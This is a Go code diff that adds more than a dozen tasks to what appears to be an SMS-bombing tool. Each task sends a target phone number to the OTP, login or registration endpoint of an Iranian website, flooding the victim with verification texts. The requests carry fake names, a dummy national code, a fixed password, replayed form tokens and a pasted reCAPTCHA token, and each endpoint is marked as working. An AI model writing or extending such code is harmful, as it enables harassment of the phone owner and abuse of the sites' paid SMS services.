@@ -541,7 +541,211 @@ tasks <- func(c *http.Client) func() {
 }(client)
 ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
+// --- 1001kharid.com (POST, FORM) ✅ 
+wg.Add(1)
+tasks <- func(c *http.Client) func() {
+    return func() {
+        formData := url.Values{}
+        formData.Set("digt_countrycode", "+98")
+        formData.Set("phone", formatPhoneWithSpaces(phone))
+        formData.Set("email", "codedbymonsmain@gmail.com")
+        formData.Set("digits_process_register", "1")
+        formData.Set("sms_otp", "")
+        formData.Set("digits_otp_field", "1")
+        formData.Set("instance_id", "d6cb3048bb8d26ad37ff3614aca5af44")
+        formData.Set("optional_data", "optional_data")
+        formData.Set("action", "digits_forms_ajax")
+        formData.Set("type", "register")
+        formData.Set("dig_otp", "")
+        formData.Set("digits", "1")
+        formData.Set("digits_redirect_page", "//www.1001kharid.com/?page=2&redirect_to=https%3A%2F%2Fwww.1001kharid.com%2F")
+        formData.Set("digits_form", "4b99e55cbf")
+        formData.Set("_wp_http_referer", "/?login=true&page=2&redirect_to=https%3A%2F%2Fwww.1001kharid.com%2F")
+        formData.Set("container", "digits_protected")
+        formData.Set("sub_action", "sms_otp")
+        sendFormRequest(c, ctx, "https://www.1001kharid.com/wp-admin/admin-ajax.php", formData, &wg, ch)
+    }
+}(client)
 
+// --- 1000gem.org (POST, JSON) ✅ 
+wg.Add(1)
+tasks <- func(c *http.Client) func() {
+    return func() {
+        payload := map[string]interface{}{
+            "updates": []map[string]interface{}{
+                {
+                    "type": "syncInput",
+                    "payload": map[string]interface{}{
+                        "id":    "erab",
+                        "name":  "phone",
+                        "value": phone,
+                    },
+                },
+                {
+                    "type": "callMethod",
+                    "payload": map[string]interface{}{
+                        "id":     "0k13",
+                        "method": "sendsms",
+                        "params": []interface{}{},
+                    },
+                },
+            },
+        }
+        sendJSONRequest(c, ctx, "https://1000gem.org/livewire/message/login-register", payload, &wg, ch)
+    }
+}(client)
+
+// --- hamrah-mechanic.com (POST, JSON) ✅ 
+wg.Add(1)
+tasks <- func(c *http.Client) func() {
+    return func() {
+        payload := map[string]interface{}{
+            "PhoneNumber":     phone,
+            "landingPageUrl":  "https://www.hamrah-mechanic.com/cars-for-sale/",
+            "orderPageUrl":    "https://www.hamrah-mechanic.com/membersignin/",
+            "prevDomainUrl":   "https://www.google.com/",
+            "prevUrl":         "https://www.hamrah-mechanic.com/cars-for-sale/",
+            "referrer":        "https://www.google.com/",
+        }
+        sendJSONRequest(c, ctx, "https://www.hamrah-mechanic.com/api/v1/membership/otp", payload, &wg, ch)
+    }
+}(client)
+
+// --- nickdigi.ir (CheckUserExists, POST, FORM) ✅ 
+wg.Add(1)
+tasks <- func(c *http.Client) func() {
+    return func() {
+        formData := url.Values{}
+        formData.Set("username", phone)
+        formData.Set("type", "CheckUsername")
+        sendFormRequest(c, ctx, "https://nickdigi.ir/wp-content/plugins/Shahkar/includes/AJAX/Clients/AUTH/CheckUserExists.php", formData, &wg, ch)
+    }
+}(client)
+
+// --- nickdigi.ir (register, POST, FORM) ✅ 
+wg.Add(1)
+tasks <- func(c *http.Client) func() {
+    return func() {
+        formData := url.Values{}
+        formData.Set("password", "monsmain@")
+        sendFormRequest(c, ctx, "https://nickdigi.ir/wp-content/plugins/Shahkar/includes/AJAX/Clients/AUTH/register.php", formData, &wg, ch)
+    }
+}(client)
+
+// --- 70kala.ir (POST, FORM) ✅ 
+wg.Add(1)
+tasks <- func(c *http.Client) func() {
+    return func() {
+        formData := url.Values{}
+        formData.Set("login_digt_countrycode", "+98")
+        formData.Set("digits_phone", formatPhoneWithSpaces(phone))
+        formData.Set("action_type", "phone")
+        formData.Set("digits", "1")
+        formData.Set("instance_id", "7b0048080e38e916af365b7a33363096")
+        formData.Set("action", "digits_forms_ajax")
+        formData.Set("type", "login")
+        formData.Set("digits_step_1_type", "")
+        formData.Set("digits_step_1_value", "")
+        formData.Set("digits_step_2_type", "")
+        formData.Set("digits_step_2_value", "")
+        formData.Set("digits_step_3_type", "")
+        formData.Set("digits_step_3_value", "")
+        formData.Set("digits_login_email_token", "")
+        formData.Set("digits_redirect_page", "//70kala.ir/?page=1&redirect_to=https%3A%2F%2F70kala.ir%2F")
+        formData.Set("digits_form", "3057f39e8c")
+        formData.Set("_wp_http_referer", "/?login=true&page=1&redirect_to=https%3A%2F%2F70kala.ir%2F")
+        formData.Set("show_force_title", "1")
+        sendFormRequest(c, ctx, "https://70kala.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
+    }
+}(client)
+
+// --- geminja.com (sendSmsMelliPayamak, POST, EMPTY) ✅ 
+wg.Add(1)
+tasks <- func(c *http.Client) func() {
+    return func() {
+        // No payload needed
+        formData := url.Values{}
+        sendFormRequest(c, ctx, "https://geminja.com/wp-json/api/sendSmsMelliPayamak", formData, &wg, ch)
+    }
+}(client)
+
+// --- geminja.com (register, POST, FORM) ✅ 
+wg.Add(1)
+tasks <- func(c *http.Client) func() {
+    return func() {
+        formData := url.Values{}
+        formData.Set("type", "register")
+        formData.Set("regMobile", phone)
+        formData.Set("dlr-register", "ثبت نام")
+        formData.Set("_dlr_mobits", "")
+        formData.Set("register", "")
+        sendFormRequest(c, ctx, "https://geminja.com/login?type=register", formData, &wg, ch)
+    }
+}(client)
+
+// --- gooshi.online (POST, JSON) ✅ 
+wg.Add(1)
+tasks <- func(c *http.Client) func() {
+    return func() {
+        payload := map[string]interface{}{
+            "mobile":      phone,
+            "name":        "مانس مین",
+            "national_code": "1000000000",
+            "referrer":    "گوگل",
+            "return_url":  "",
+        }
+        sendJSONRequest(c, ctx, "https://gooshi.online/site/api/v1/user/otp", payload, &wg, ch)
+    }
+}(client)
+
+// --- vidovin.com (POST, JSON) ✅ 
+wg.Add(1)
+tasks <- func(c *http.Client) func() {
+    return func() {
+        payload := map[string]interface{}{
+            "MobileNo": phone,
+        }
+        sendJSONRequest(c, ctx, "https://www.vidovin.com/Users/LoginPopup", payload, &wg, ch)
+    }
+}(client)
+
+// --- my.limoome.com (check-mobile, POST, JSON) ✅ 
+wg.Add(1)
+tasks <- func(c *http.Client) func() {
+    return func() {
+        phoneNo98 := strings.TrimPrefix(phone, "+98")
+        payload := map[string]interface{}{
+            "mobileNumber": phoneNo98,
+            "countryId":    "1",
+        }
+        sendJSONRequest(c, ctx, "https://my.limoome.com/auth/check-mobile", payload, &wg, ch)
+    }
+}(client)
+
+// --- my.limoome.com (api/auth/login/otp, POST, FORM) ✅ 
+wg.Add(1)
+tasks <- func(c *http.Client) func() {
+    return func() {
+        phoneNo98 := strings.TrimPrefix(phone, "+98")
+        formData := url.Values{}
+        formData.Set("mobileNumber", phoneNo98)
+        formData.Set("country", "1")
+        sendFormRequest(c, ctx, "https://my.limoome.com/api/auth/login/otp", formData, &wg, ch)
+    }
+}(client)
+
+// --- my.okcs.com  ✅ 
+wg.Add(1)
+tasks <- func(c *http.Client) func() {
+    return func() {
+        phoneNo98 := strings.TrimPrefix(phone, "+98")
+        payload := map[string]interface{}{
+            "mobile": "0" + phoneNo98,
+            "g-recaptcha-response": "03AGdBq255m4Cy9SQ1L5cgT6yD52wZzKacalaZZw41D-jlJzSKsEZEuJdb4ujcJKMjPveDKpAcMk4kB0OULT5b3v7oO_Zp8Rb9olC5lZH0Q0BVaxWWJEPfV8Rf70L58JTSyfMTcocYrkdIA7sAIo7TVTRrH5QFWwUiwoipMc_AtfN-IcEHcWRJ2Yl4rT4hnf6ZI8QRBG8K3JKC5oOPXfDF-vv4Ah6KsNPXF3eMOQp3vM0SfMNrBgRbtdjQYCGpKbNU7P7uC7nxpmm0wFivabZwwqC1VcpH-IYz_vIPcioK2vqzHPTs7t1HmW_bkGpkZANsKeDKnKJd8dpVCUB1-UZfKJVxc48GYeGPrhkHGJWEwsUW0FbKJBjLO0BdMJXHhDJHg3NGgVHlnOuQV_wRNMbUB9V5_s6GM_zNDFBPgD5ErCXkrE40WrMsl1R6oWslOIxcSWzXruchmKfe"
+        }
+        sendJSONRequest(c, ctx, "https://my.okcs.com/api/check-mobile", payload, &wg, ch)
+    }
+}(client)
 
 
 
